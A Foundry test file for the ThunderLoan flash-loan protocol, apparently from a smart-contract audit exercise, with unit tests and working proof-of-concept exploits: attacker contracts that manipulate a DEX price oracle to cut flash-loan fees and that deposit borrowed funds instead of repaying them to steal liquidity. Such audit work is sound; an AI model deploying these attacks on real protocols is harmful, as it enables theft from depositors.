// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    function test_LiquidatorCanRedeem() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        uint256 liquidatorBalanceBeforeDeposit = tokenA.balanceOf(liquidityProvider);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);

        uint256 liquidatorBalanceAfterDeposit = asset.balanceOf(liquidityProvider);

        // redeem
        // since the liquidator is redeeming, the liquidator balance of this `tokenA` should be greater than or equal to
        // the previous balance
        // the reason it can be greater is because of echange rate

        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, AMOUNT);
        vm.stopPrank();

        uint256 liquidatorBalanceAfterRedeem = tokenA.balanceOf(liquidityProvider);

        console2.log("liquidatorBalanceBeforeDeposit", liquidatorBalanceBeforeDeposit);
        console2.log("liquidatorBalanceAfterDeposit ", liquidatorBalanceAfterDeposit);
        console2.log("liquidatorBalanceAfterRedeem  ", liquidatorBalanceAfterRedeem);

        // when a liquidator is calling redeem
        // the liquidator should be able to withdraw the deposit
        // but when the liquidator is depositing the token, `fee` is calculated and `updateExchangeRate` is called
        // which increases the `totalSupply` variable. but the original balance will not go up
        // because no one didn't take any flash loan and paid a fees
        // Even if someone took out a flash loan and paid the fees
        // still `totalSupply` value and `totalBalance` will not match
        // all because of updating excahnge rate during deposit
        // this will disrupt the protocol
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function test_LiquidatorCanRedeem_AfterFlashLoan() public setAllowedToken {
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);

        uint256 liquidatorBalanceBeforeDeposit = tokenA.balanceOf(liquidityProvider);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);

        uint256 liquidatorBalanceAfterDeposit = asset.balanceOf(liquidityProvider);

        // flashloan
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        // we are minting the `mockFlashLoanReceiver` will the `calculatedFee`
        // so that it can pay the fees
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // redeem
        // since the liquidator is redeeming, the liquidator balance of this `tokenA` should be greater than or equal to
        // the previous balance
        // the reason it can be greater is because of echange rate

        uint256 amountToRedeem = type(uint256).max;

        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();

        uint256 liquidatorBalanceAfterRedeem = tokenA.balanceOf(liquidityProvider);

        console2.log("liquidatorBalanceBeforeDeposit", liquidatorBalanceBeforeDeposit);
        console2.log("liquidatorBalanceAfterDeposit ", liquidatorBalanceAfterDeposit);
        console2.log("liquidatorBalanceAfterRedeem  ", liquidatorBalanceAfterRedeem);

        // when a liquidator is calling redeem
        // the liquidator should be able to withdraw the deposit
        // but when the liquidator is depositing the token, `fee` is calculated and `updateExchangeRate` is called
        // which increases the `totalSupply` variable. but the original balance will not go up
        // because no one didn't take any flash loan and paid a fees
        // Even if someone took out a flash loan and paid the fees
        // still `totalSupply` value and `totalBalance` will not match
        // all because of updating excahnge rate during deposit
        // this will disrupt the protocol

        // InitalDeposit by liquidator = 1000e18
        // After someone took out a flash loan
        // fee was accumulated
        // which is 0.3e18
        // total will be (1000e18 + 0.3e18)/1e18(for precision)
        // 1000.3e18

        // but while redeeming, the redeem amount exceeds the totalBalance of assetToken
        // because of the `fee` and `updateExchangeRate` in deposit
    }

    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }

    function test_UpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console2.log("Fee Before: ", feeBeforeUpgrade);
        console2.log("Fee After: ", feeAfterUpgrade);

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }

    function testOracleManipulation() public {
        // 1. Setup Contracts!
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        // use weth from baseTest

        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Create a TSwap Dex between WETH / Token A
        address tswapPool = pf.createPool(address(tokenA));

        // we are going to use proxy address as the `thunderLoan` contract
        thunderLoan = ThunderLoan(address(proxy));

        // initialize
        thunderLoan.initialize(address(pf));

        // 2. Fund TSwap
        // To fund the TSwap
        // we have to mint the liquidator USDC and tokenA
        vm.startPrank(liquidityProvider);

        uint256 tokenAToDeposit = 100e18;
        uint256 wethToDeposit = 100e18;

        tokenA.mint(address(liquidityProvider), tokenAToDeposit);
        tokenA.approve(address(tswapPool), tokenAToDeposit);

        weth.mint(address(liquidityProvider), wethToDeposit);
        weth.approve(address(tswapPool), wethToDeposit);

        BuffMockTSwap(tswapPool).deposit(wethToDeposit, 100e18, tokenAToDeposit, block.timestamp);
        // Ratio 100 WETH & 100 TokenA
        // meaning ratio is `1:1`

        vm.stopPrank();

        // 3. Deposit tokens to the thunderLoan protocol
        // To deposit tokens to, the token has to be allowed
        thunderLoan.setAllowedToken(tokenA, true);

        uint256 tokenAToDepositOnThunderLoan = 1000e18;

        // let's deposit
        vm.startPrank(liquidityProvider);

        tokenA.mint(address(liquidityProvider), tokenAToDepositOnThunderLoan);
        tokenA.approve(address(thunderLoan), tokenAToDepositOnThunderLoan);

        //deposit
        thunderLoan.deposit(tokenA, tokenAToDepositOnThunderLoan);
        // thunderLoan has tokenA of 1000e18
        // now anyone can take a flash loan of tokenA for max of 1000e18

        vm.stopPrank();

        // 100 WETH & 100 TokenA in TSwap
        // 1000 TokenA in ThunderLoan

        // 4. We are going to take 2 flash loans
        //      a. To nuke the price of WETH/tokenA on TSwap
        //      b. To show that doing so, greatly reduces the fees we pay on thunderloan

        // let's take the first flashLoan
        // Take out a flash loan of 50 tokenA
        // swap it on the DEX, tanking the price
        // let's say user swapped 50 token A for 20 WETH
        // Now the pool will contain `150 tokenA` and `80 WETH`

        // Let's take another flash loan of 50 tokenA
        // when we are taking the second flash loan
        // fee will be calculated based on the TSwap oracle which the user already manipulated
        // fee will be calculated based on how many tokenA is present
        // since more tokenA is present, fee will be cheap
        // therfore the user will take out the flash loan for very cheap `fee`
        // Due to this oracle manipulation
        // the liquidity providers will get very less interest in return
        // which will disrupt the protocol

        // let's calculate the fee if TSwap is not manipulated
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("Normal fee is", normalFeeCost); // 0.296147410319118389
        // If we take a flash loan for `100e18` of token A, this will be the cost
        // but this user is taking 2 flash loans of 50 tokenA
        // adding both the fee for flash loan should be equal as the above

        uint256 amountToBorrow = 50e18;

        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            tswapPool, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);

        // first flashloan
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        // the above line will call the flashloan on thunderLoan
        // thunderLoan will call the `executeOperation` inside the `flr` contract

        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console2.log("Fee for 1st flash loan", flr.feeOne());
        console2.log("Fee for 2nd flash loan", flr.feeTwo());
        console2.log("Attack Fee", attackFee);
        assertLt(attackFee, normalFeeCost);

        // If we take a flash loan for `100e18` of token A, cost is
        // flash loan fee for 100 tokenA                                0.296147410319118389
        // but this user is taking 2 flash loans of 50 tokenA
        // first flashloan cost                                           148073705159559194
        // second flash loan cost                                          66093895772631111
        // adding both the fee for flash loan should be equal as the above
        // adding 2 flash loans                                          0.214167600932190305

        // we can see that for second flash loan, fee is very cheap
        // eventhough the flash loan amount is same

        // 0.296147410319118389 // 1 flashloan of 100e18
        // 0.214167600932190305 // 2 flashloans of 50e18
        // after adding 2 fees, it will be very less than the fee for taking flash loan for 100 tokenA
    }

    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        // let's take out a flash loan
        // to take out a flash loan we need a smart contract

        vm.startPrank(user);

        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));

        // we are minting `fee` to `Dor` so it can pay the fee for the flashloan
        tokenA.mint(address(dor), fee);

        // let's call the flashloan
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");

        // redeem
        dor.redeemMoney();

        vm.stopPrank();

        uint256 dorBalanceAfter = tokenA.balanceOf(address(dor));

        assert(dorBalanceAfter > amountToBorrow + fee);
    }

    function testUpdrageCausesStorageCollison() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();

        ThunderLoanUpgraded thunderLoanUpgraded = new ThunderLoanUpgraded();

        vm.startPrank(thunderLoan.owner());

        // upgrading the proxy
        // pointing to new implementation
        thunderLoan.upgradeToAndCall(address(thunderLoanUpgraded), "");

        vm.stopPrank();

        uint256 feeAfterUpgrade = thunderLoan.getFee();

        console2.log("feeBefore", feeBeforeUpgrade);
        console2.log("feeAfter ", feeAfterUpgrade);

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
}

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token, // this token is tokenA in this instance
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);

        // let's get the assetToken
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));

        // since we are depositing, we have to approve
        IERC20(token).approve(address(thunderLoan), amount + fee);

        // after taking the flash loan
        // thunderLoan will call this contract
        // this contract should be used to `repay` the flashloan with fee
        // but in the `flashloan` function in `thunderloan`
        // during the end of the transaction, it is checking the balanceOf(token)
        // wether new balance of token is equal to the previous `balance + fee`
        // if we called repay and repaid the flash loan with fee, the transaction will go through
        // but there is an exploit
        // instead of repaying the loan
        // user can also `deposit`
        // after taking the flash loan user will call `deposit()` with `amount + fee`
        // now new balance of token is equal to the previous `balance + fee`
        // so the check will pass and user has taken a flash loan and deposited all the funds
        // Which severly disrupts the protocol
        // because this user took a flash loan, which is liquidators money
        // this user stole the money became a liquidator
        thunderLoan.deposit(IERC20(token), amount + fee);

        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    // 1. Swap tokenA borrowed for WETH
    // 2. Take out Another flash loan, to show the difference in fee
    ThunderLoan thunderLoan;
    BuffMockTSwap tswapPool;
    address repayAddress;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    // when the first flash loan is taken
    // `thunderLoan`contract will call this function
    // this is the function which will perform all the malicious operations
    // 1. Swap tokenA borrowed for WETH
    // 2. Take out Another flash loan, to show the difference in fee
    function executeOperation(
        address token, // this token is tokenA in this instance
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            // 1. Swap tokenA borrowed for WETH
            // 2. Take out Another flash loan, to show the difference in fee
            feeOne = fee;
            attacked = true;

            // we are going to deposit 50 tokenA and we need to get know how many weth we can expect
            // already weth and tokenA reserve contain 100e18
            // to know how much weth we can expect we can call `getOutputAmountBasedOnInput` and say we are going to
            // deposit `50e18` of tokenA and totalSupply of weth and tokenA which is 100e18 each
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);

            // now we are swapping tokenA for weth
            // we will get whatever the equivalent of `weth` for 50e18 tokenA
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // which means we will have 150 tokenA and less weth
            // this will tank the price of tokenA, because it has more
            // now when a user takes a flash loan
            // `fee` will be calculated based on the tokenA, since more tokenA is present
            // `fee` will be very cheap

            // we call a second flash loan
            // we are taking second flash loan for `tokenA 50e18`
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            // once the flashloan is called again
            // `thunderLoan` will call `executeOperation` again
            // but this time `attacked` will be true
            // therfore `else` will get executed

            // repaying the first flash loan
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate the fee and repay

            // when second flash is called, this block of code will get executed
            // `executeOperation` will be called from `thunderLoan` with `fee` and other params
            feeTwo = fee;

            // repaying the second flash loan
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}

// contract DepositOverRepay is IFlashLoanReceiver {
//     ThunderLoan thunderLoan;
//     AssetToken assetToken;
//     IERC20 s_token;

//     constructor(address _thunderLoan) {
//         thunderLoan = ThunderLoan(_thunderLoan);
//     }

//     function executeOperation(
//         address token,
//         uint256 amount,
//         uint256 fee,
//         address, /*initiator*/
//         bytes calldata /*params*/
//     )
//         external
//         returns (bool)
//     {
//         s_token = IERC20(token);
//         assetToken = thunderLoan.getAssetFromToken(IERC20(token));
//         s_token.approve(address(thunderLoan), amount + fee);
//         thunderLoan.deposit(IERC20(token), amount + fee);
//         return true;
//     }

//     function redeemMoney() public {
//         uint256 amount = assetToken.balanceOf(address(this));
//         thunderLoan.redeem(s_token, amount);
//     }
// }

// contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
//     ThunderLoan thunderLoan;
//     address repayAddress;
//     BuffMockTSwap tswapPool;
//     bool attacked;
//     uint256 public feeOne;
//     uint256 public feeTwo;

//     constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
//         tswapPool = BuffMockTSwap(_tswapPool);
//         thunderLoan = ThunderLoan(_thunderLoan);
//         repayAddress = _repayAddress;
//     }

//     function executeOperation(
//         address token,
//         uint256 amount,
//         uint256 fee,
//         address, /*initiator*/
//         bytes calldata /*params*/
//     )
//         external
//         returns (bool)
//     {
//         if (!attacked) {
//             // 1. Swap tokenA borrowed for WETH
//             // 2. Take out ANOTHER flash loan, to show the difference
//             feeOne = fee;
//             attacked = true;
//             uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
//             IERC20(token).approve(address(tswapPool), 50e18);
//             // Tanks the price
//             tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);

//             // we call a second flash loan
//             thunderLoan.flashloan(address(this), IERC20(token), amount, "");
//             // repay
//             // IERC20(token).approve(address(thunderLoan), amount + fee);
//             // thunderLoan.repay(IERC20(token), amount + fee);
//             IERC20(token).transfer(address(repayAddress), amount + fee);
//         } else {
//             feeTwo = fee;
//             // repay
//             // IERC20(token).approve(address(thunderLoan), amount + fee);
//             // thunderLoan.repay(IERC20(token), amount + fee);

//             IERC20(token).transfer(address(repayAddress), amount + fee);
//         }

//         return true;
//     }
// }
